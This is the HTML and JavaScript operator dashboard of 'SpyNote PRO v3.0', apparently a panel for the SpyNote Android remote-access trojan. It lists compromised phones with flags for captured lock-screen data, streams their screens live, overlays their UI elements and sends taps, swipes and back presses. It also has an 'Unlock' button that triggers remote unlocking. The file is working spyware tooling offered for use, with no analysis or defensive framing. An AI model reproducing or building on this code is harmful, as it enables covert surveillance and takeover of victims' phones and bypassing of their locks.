<!DOCTYPE html>
<html>
<head>
    <title>ðŸ“± SpyNote PRO v3.0 - Layout + Unlock</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden;
        }
        
        #devices {
            position: fixed; top: 15px; left: 15px; z-index: 100;
            background: rgba(0,0,0,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 300px; 
            border-radius: 16px; backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1);
        }
        .device { 
            padding: 16px; margin: 10px 0; background: rgba(50,50,70,0.8); 
            cursor: pointer; border-radius: 12px; transition: all 0.3s ease;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .device:hover { 
            background: rgba(0,170,120,0.9); transform: translateX(8px); box-shadow: 0 8px 25px rgba(0,170,120,0.3);
        }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; }
        .screen-off { border-left: 4px solid #ff4444; }
        .has-lock { border-left: 4px solid #ffaa00; }

        #phone-container {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: min(95vw, 450px); height: min(95vh, 900px); 
            background: #000; border-radius: 40px; 
            padding: 30px 25px; box-shadow: 0 30px 80px rgba(0,0,0,0.8);
            border: 3px solid rgba(255,255,255,0.1);
            touch-action: none;
        }
        
        #screen { 
            width: 100%; height: 100%; 
            border-radius: 25px; background: #111;
            image-rendering: optimizeSpeed; 
            cursor: pointer;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
        }

        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 10;
        }
        .layout-element {
            position: absolute; border: 2px solid rgba(0,255,136,0.6);
            background: rgba(0,255,136,0.1); border-radius: 4px;
            font-size: 11px; padding: 2px 4px; backdrop-filter: blur(5px);
            transition: all 0.2s ease; cursor: pointer;
        }
        .layout-element:hover {
            border-color: #00ff88 !important; background: rgba(0,255,136,0.3);
            transform: scale(1.05);
        }
        .clickable { border-color: #ff6b6b !important; background: rgba(255,107,107,0.2); }

        #status-bar {
            position: fixed; top: 15px; right: 15px; z-index: 100;
            background: rgba(0,0,0,0.9); padding: 15px 20px; 
            border-radius: 12px; backdrop-filter: blur(20px); font-size: 13px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        #fps-counter { color: #00ff88; font-weight: bold; }

        #controls {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 10px; z-index: 100; flex-wrap: wrap;
        }
        button {
            padding: 12px 20px; background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            color: white; border: none; border-radius: 25px; cursor: pointer;
            font-size: 14px; font-weight: 600; transition: all 0.3s;
            box-shadow: 0 6px 20px rgba(102,126,234,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.6); }
        .unlock-btn { background: linear-gradient(45deg, #ff6b6b, #ee5a52) !important; }
        .layout-toggle { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; }

        #loading { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%);
            font-size: 18px; color: #00ff88; display: none;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 20px; color: #00ff88;">ðŸ“± Connected Devices</h3>
        <div id="device-list">Loading devices...</div>
    </div>
    
    <div id="status-bar">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div id="fps-counter">FPS: 0 | Device: <span id="selectedDevice">-</span></div>
        <div>Screen: <span id="screenStatus">ON</span> | Layout: <span id="layoutStatus">OFF</span></div>
        <div>Latency: <span id="latency">0ms</span></div>
    </div>

    <div id="phone-container">
        <canvas id="screen"></canvas>
        <canvas id="layout-overlay"></canvas>
    </div>

    <div id="loading">
        <div class="spinner"></div>
        Waiting for screen...
    </div>

    <div id="controls">
        <button onclick="sendBack()">ðŸ”™ Back</button>
        <button onclick="toggleLayout()">ðŸ“‹ Layout</button>
        <button onclick="toggleUnlock()" id="unlockBtn" style="display:none;">ðŸ”“ Unlock</button>
        <button onclick="sendScroll()">ðŸ“œ Scroll</button>
        <button onclick="toggleFullScreen()">ðŸ“± Full</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'], upgrade: false });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let lastFrameTime = 0, frameCount = 0, avgLatency = 0;
        let showLayout = false;
        let isDragging = false;
        let dragStart = { x: 0, y: 0 };
        let layoutElements = [];

        const canvas = document.getElementById('screen');
        const overlayCanvas = document.getElementById('layout-overlay');
        const ctx = canvas.getContext('2d');
        const overlayCtx = overlayCanvas.getContext('2d');
        const phoneContainer = document.getElementById('phone-container');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDeviceSpan = document.getElementById('selectedDevice');
        const screenStatus = document.getElementById('screenStatus');
        const layoutStatus = document.getElementById('layoutStatus');
        const latencySpan = document.getElementById('latency');
        const unlockBtn = document.getElementById('unlockBtn');
        const loading = document.getElementById('loading');

        socket.on('connect', () => {
            connectionStatus.textContent = 'âœ… Connected';
            connectionStatus.style.color = '#00ff88';
            loadDevices();
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-frame', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            loading.style.display = 'none';
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            const img = new Image();
            const frameStart = performance.now();
            
            img.onload = () => {
                const rect = phoneContainer.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                overlayCanvas.width = rect.width;
                overlayCanvas.height = rect.height;
                
                ctx.imageSmoothingEnabled = false;
                ctx.imageSmoothingQuality = 'high';
                ctx.drawImage(img, 0, 0, rect.width, rect.height);
                
                // Update screen status
                screenStatus.textContent = data.screenOn ? 'ON' : 'OFF';
                screenStatus.style.color = data.screenOn ? '#00ff88' : '#ff4444';
                
                // ðŸ”¥ ULTRA SMOOTH LAYOUT OVERLAY
                if (showLayout && data.layoutData) {
                    renderLayoutOverlay(data.layoutData, rect.width, rect.height);
                }

                // FPS & Latency
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    document.getElementById('fps-counter').textContent = 
                        `FPS: ${fps} | Device: ${currentDevice.slice(0,8)}`;
                    frameCount = 0;
                    lastFrameTime = now;
                }
                
                const latency = Math.round(now - (data.timestamp / 1000));
                avgLatency = avgLatency * 0.8 + latency * 0.2;
                latencySpan.textContent = `${Math.round(avgLatency)}ms`;
            };
            
            img.src = 'data:image/jpeg;base64,' + data.data;
        });

        function renderLayoutOverlay(layoutData, canvasWidth, canvasHeight) {
            overlayCtx.clearRect(0, 0, canvasWidth, canvasHeight);
            layoutElements = [];
            
            try {
                for (let element of layoutData) {
                    const bounds = element.bounds;
                    const text = element.text || element.contentDesc || '';
                    const clickable = element.clickable;
                    
                    if (bounds && text.trim() && bounds.centerX && bounds.centerY) {
                        const scaleX = canvasWidth / deviceWidth;
                        const scaleY = canvasHeight / deviceHeight;
                        
                        const x = bounds.left * scaleX;
                        const y = bounds.top * scaleY;
                        const w = (bounds.right - bounds.left) * scaleX;
                        const h = (bounds.bottom - bounds.top) * scaleY;
                        
                        layoutElements.push({
                            x, y, w, h, text, clickable,
                            centerX: bounds.centerX * scaleX,
                            centerY: bounds.centerY * scaleY
                        });
                    }
                }
                
                // Draw elements
                layoutElements.forEach(el => {
                    overlayCtx.strokeStyle = el.clickable ? 'rgba(255,107,107,0.8)' : 'rgba(0,255,136,0.6)';
                    overlayCtx.lineWidth = 2;
                    overlayCtx.strokeRect(el.x, el.y, el.w, el.h);
                    
                    overlayCtx.fillStyle = el.clickable ? 'rgba(255,107,107,0.9)' : 'rgba(0,255,136,0.9)';
                    overlayCtx.font = '11px monospace';
                    overlayCtx.fillText(el.text.slice(0,20), el.x + 2, el.y + 12);
                });
            } catch (e) {
                console.log('Layout render error:', e);
            }
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneContainer.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        phoneContainer.addEventListener('mousedown', startTouch);
        phoneContainer.addEventListener('mousemove', dragTouch);
        phoneContainer.addEventListener('mouseup', endTouch);
        phoneContainer.addEventListener('mouseleave', endTouch);
        phoneContainer.addEventListener('touchstart', startTouch, { passive: false });
        phoneContainer.addEventListener('touchmove', dragTouch, { passive: false });
        phoneContainer.addEventListener('touchend', endTouch, { passive: false });

        function startTouch(e) {
            e.preventDefault();
            isDragging = true;
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            
            // Check layout element click
            const element = layoutElements.find(el => 
                coords.x >= el.centerX - 50 && coords.x <= el.centerX + 50 &&
                coords.y >= el.centerY - 50 && coords.y <= el.centerY + 50
            );
            if (element && showLayout) {
                console.log('ðŸŽ¯ Layout click:', element.text);
            }
            
            dragStart = coords;
            sendTap(coords.x, coords.y);
        }

        function dragTouch(e) {
            if (!isDragging || !currentDevice) return;
            e.preventDefault();
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
        }

        function endTouch(e) {
            isDragging = false;
        }

        function loadDevices() {
            fetch('/devices').then(r => r.json()).then(updateDeviceList);
        }

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => {
                    const screenOff = !info.screenOn;
                    const hasLock = info.hasLockData;
                    return `
                        <div class="device ${currentDevice === id ? 'active' : ''} 
                             ${screenOff ? 'screen-off' : ''} ${hasLock ? 'has-lock' : ''}" 
                             onclick="selectDevice('${id}', this)" title="${info.model}">
                            <b>${info.model?.slice(0,15) || id.slice(0,8)}...</b><br>
                            <small>${info.brand || 'Android'} ${info.version || ''}</small><br>
                            <small>${info.width || ''}x${info.height || ''}</small>
                            <div style="margin-top: 5px; font-size: 12px;">
                                ${info.connected ? 'ðŸŸ¢ LIVE' : 'ðŸ”´ OFFLINE'}
                                ${screenOff ? ' | ðŸ“´ OFF' : ''}
                                ${hasLock ? ' | ðŸ”’ LOCK' : ''}
                            </div>
                        </div>
                    `;
                }).join('') : '<div style="text-align:center;opacity:0.5;">No devices online</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDeviceSpan.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            loading.style.display = 'block';
            socket.emit('select-device', { deviceId });
            unlockBtn.style.display = 'inline-block';
        }

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x, y 
            });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, 
                endX: ex, endY: ey 
            });
        }

        function sendScroll() {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'scroll', 
                x: deviceWidth/2, y: deviceHeight/2 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function toggleLayout() {
            showLayout = !showLayout;
            layoutStatus.textContent = showLayout ? 'ON' : 'OFF';
            layoutStatus.style.color = showLayout ? '#00ff88' : '#ffaa00';
            overlayCanvas.style.opacity = showLayout ? '1' : '0';
        }

        function toggleUnlock() {
            if (!currentDevice) return;
            socket.emit('unlock-device', { deviceId: currentDevice });
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }
    </script>
</body>
</html>
